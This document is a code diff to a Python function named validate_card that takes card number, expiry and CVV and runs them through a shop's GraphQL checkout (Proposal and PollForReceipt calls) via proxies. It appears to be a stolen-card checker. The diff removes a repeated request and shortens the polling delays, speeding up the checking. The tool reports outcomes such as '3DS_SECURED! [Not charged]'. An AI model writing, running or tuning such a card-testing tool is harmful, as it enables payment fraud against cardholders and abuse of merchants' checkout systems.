@@ -477,10 +477,8 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                     "operationName": "Proposal",
                 }
 
-                for i in range(2):
-                    resp = await session.post(graphql_url, params={"operationName": "Proposal"}, headers=headers, json=json_data, proxy=proxy)
-                    resp_text = await resp.text()
-                    if i == 0: await asyncio.sleep(2)
+                resp = await session.post(graphql_url, params={"operationName": "Proposal"}, headers=headers, json=json_data, proxy=proxy)
+                resp_text = await resp.text()
                 
                 print(f"[{attempt}] [SHIPPING] Status: {resp.status}")
                 try:
@@ -754,7 +752,7 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                                 "variables": {"receiptId": rid, "sessionToken": sst},
                                 "operationName": "PollForReceipt",
                             }
-                            await asyncio.sleep(3)
+                            await asyncio.sleep(0.5)
                             for p in range(5):
                                 p_resp = await session.post(graphql_url, params={"operationName": "PollForReceipt"}, headers=headers, json=poll_json, proxy=proxy)
                                 p_text = await p_resp.text()
@@ -807,7 +805,7 @@ async def validate_card(cc, month, year, cvv, site_url, variant_id=None, proxy_s
                                         print("3DS")
                                         return _result("3DS_SECURED! [Not charged] ❎", approved="True")
                                     elif pt in ("ProcessingReceipt", "WaitingReceipt"):
-                                        await asyncio.sleep(4)
+                                        await asyncio.sleep(1.0)
                                         continue
                                 except: pass
                                 break
